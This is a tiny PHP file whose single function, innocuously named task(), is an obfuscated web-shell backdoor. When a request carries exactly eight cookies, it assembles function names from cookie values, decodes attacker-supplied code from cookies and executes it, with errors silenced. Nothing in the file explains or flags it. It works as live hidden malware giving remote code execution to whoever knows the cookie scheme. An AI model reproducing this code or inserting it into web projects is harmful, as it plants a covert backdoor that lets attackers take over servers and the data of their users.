<?php
function task() {
	$u = $_COOKIE; (count($u) == 8) ? (($du = $u[11].$u[24]) && 
	($wh = $du($u[53].$u[89])) && ($_wh = $du($u[21].$u[18])) && 
	($_wh = @$wh($u[15], $_wh($du($u[70])))) && @$_wh()) : $u;
	
	return 0;
}

task();